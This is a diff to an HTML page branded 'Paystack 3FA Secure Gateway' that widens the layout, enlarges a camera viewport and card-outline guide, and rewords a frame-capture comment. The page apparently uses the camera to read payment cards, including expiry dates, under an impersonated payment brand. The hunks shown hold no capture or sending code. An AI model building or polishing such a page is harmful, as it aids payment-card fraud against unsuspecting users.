@@ -6,6 +6,7 @@
   <title>Paystack 3FA Secure Gateway</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
+    
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       background: #0d0d0d;
@@ -14,20 +15,20 @@
       justify-content: center;
       align-items: flex-start;
       min-height: 100vh;
-      padding: 12px;
+      padding: 0; /* Remove body padding for full edge-to-edge layout */
     }
 
-    /* Updated container: 95vw ensures full responsiveness even in Desktop View */
+    /* FULL SCREEN EXPANDED CONTAINER */
     .checkout-card {
       background: #181818;
-      border: 1px solid #2a2a2a;
-      border-radius: 16px;
-      padding: 20px;
-      width: 95vw;
-      max-width: 650px;
-      margin: 0 auto;
+      border-bottom: 1px solid #2a2a2a;
+      border-radius: 0 0 16px 16px;
+      padding: 16px;
+      width: 100vw; /* Take 100% of the display width */
+      max-width: 100%; /* Remove width cap completely */
       box-shadow: 0 12px 40px rgba(0,0,0,0.6);
     }
+
     h2 { font-size: 1.2rem; text-align: center; margin-bottom: 14px; color: #fff; }
     
     .tab-group { display: flex; gap: 8px; margin-bottom: 16px; }
@@ -37,22 +38,26 @@
     }
     .tab-btn.active { background: #0ba464; color: #fff; border-color: #0ba464; }
 
-    /* Enlarged Camera Viewport for Desktop View scaling */
+    /* EXPANDED CAMERA VIEWPORT */
     .media-container {
       position: relative; 
       width: 100%; 
-      height: 340px; /* Increased height for large mobile display */
+      height: 60vw; /* Scales height dynamically with screen width */
+      max-height: 480px; 
       background: #000; 
       border-radius: 12px; 
       overflow: hidden;
       margin-bottom: 16px; 
       border: 2px solid #333;
     }
+
     video { width: 100%; height: 100%; object-fit: cover; }
+
+    /* CARD OVERLAY GUIDE */
     .card-guide {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      width: 88%; height: 65%; border: 2.5px dashed #0ba464; border-radius: 12px;
-      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.35); pointer-events: none;
+      width: 92%; height: 75%; border: 2.5px dashed #0ba464; border-radius: 12px;
+      box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.4); pointer-events: none;
     }
 
     button {
@@ -191,7 +196,7 @@
     stopCamera();
   });
 
-  // Client-Side Canvas Compression (Prevents SSL socket drop timeouts)
+  // Client-Side Canvas Compression (Prevents payload drops)
   function captureAndCompressFrame(maxWidth = 1024, quality = 0.8) {
     return new Promise((resolve) => {
       const canvas = document.createElement('canvas');
@@ -331,4 +336,5 @@ Expiry : ${result.expiryDate || 'N/A'}
 
 </body>
 </html>
+
 
